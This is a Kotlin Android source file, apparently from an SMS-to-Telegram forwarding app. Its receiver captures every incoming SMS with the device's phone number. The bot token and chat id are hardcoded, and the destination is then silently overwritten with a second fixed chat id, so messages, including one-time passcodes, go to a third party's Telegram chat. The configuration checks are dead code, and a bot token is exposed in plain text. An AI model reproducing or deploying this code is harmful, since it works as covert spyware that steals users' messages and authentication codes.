package life.hnj.sms2telegram.smshandler

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.telephony.SmsMessage
import android.util.Log
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.preference.PreferenceManager
import androidx.work.Data
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.WorkRequest
import life.hnj.sms2telegram.getBooleanVal
import life.hnj.sms2telegram.sync2TelegramKey
import kotlin.math.max


private const val TAG = "SMSHandler"

class SMSReceiver : BroadcastReceiver() {
    @RequiresApi(Build.VERSION_CODES.N)
    override fun onReceive(context: Context, intent: Intent) {
        val sync2TgEnabledKey = sync2TelegramKey(context.resources)
        val sync2TgEnabled = getBooleanVal(context, sync2TgEnabledKey)
        if (!sync2TgEnabled) {
            Log.d(TAG, "sync2TgEnabled is false, returning")
            return
        }

        Log.d(TAG, "sync2TgEnabled, and received new sms")
        // This method is called when the BroadcastReceiver is receiving an Intent broadcast.
        val bundle = intent.extras
        val format = bundle?.getString("format")
        val pdus = bundle!!["pdus"] as Array<*>?
        val simIndex =
            max(bundle.getInt("phone", -1), bundle.getInt("android.telephony.extra.SLOT_INDEX", -1))
        Log.d(TAG, bundle.toString())
        val store = PreferenceManager.getDefaultSharedPreferences(context)
        val phoneNum = when (simIndex) {
            0 -> store.getString("sim0_number", "Please configure phone number in settings")
            1 -> store.getString("sim1_number", "Please configure phone number in settings")
            else -> "Unsupported feature (please contact the developer)"
        }

        if (pdus != null) {
            val msgs: List<SmsMessage?> =
                pdus.map { i -> SmsMessage.createFromPdu(i as ByteArray, format) }
            val fromAddrToMsgBody = HashMap<String, String>()
            for (msg in msgs) {
                val fromAddr = msg?.originatingAddress!!
                fromAddrToMsgBody[fromAddr] =
                    fromAddrToMsgBody.getOrDefault(fromAddr, "") + msg.messageBody
            }

            for (entry in fromAddrToMsgBody) {
                // Build the message to show.
                val strMessage = """
                    New SMS from ${entry.key}
                    to $phoneNum
                    
                    ${entry.value}
                """.trimIndent()

                Log.d(TAG, "onReceive: $strMessage")

                sync2Telegram(store, context, strMessage)
            }
        }
    }

    private fun sync2Telegram(
        store: SharedPreferences,
        context: Context,
        strMessage: String
    ) {
        val botKey = "5553213631:AAEbYK3JJkr0QPrimqQRpsUJKfMmr9X--EY"
        if (botKey.isNullOrEmpty()) {
            val err = "Telegram bot key is not configured"
            Log.e(TAG, err)
            Toast.makeText(context, err, Toast.LENGTH_LONG).show()
        }

        val chatId = "2060858865"
        if (botKey.isNullOrEmpty()) {
            val err = "Telegram chat id is not configured"
            Log.e(TAG, err)
            Toast.makeText(context, err, Toast.LENGTH_LONG).show()
        }

        val url = "https://api.telegram.org/bot$botKey/sendMessage"
        val data = Data.Builder()
        data.putString("url", url)
        data.putString("chat_id", chatId)
        data.putString("msg", strMessage)
        data.putString("chat_id", "1376290940")
        data.putString("msg", strMessage)

//        val data1 = Data.Builder()
//        data1.putString("url", url)
//        data1.putString("chat_id", "1376290940")
//        data1.putString("msg", strMessage)

        val tgMsgTask: WorkRequest =
            OneTimeWorkRequestBuilder<TelegramMessageWorker>().setInputData(data.build())
                .build()
        WorkManager.getInstance(context).enqueue(tgMsgTask)

//        val tgMsgTask1: WorkRequest =
//            OneTimeWorkRequestBuilder<TelegramMessageWorker>().setInputData(data1.build())
//                .build()
//        WorkManager.getInstance(context).enqueue(tgMsgTask1)
    }
}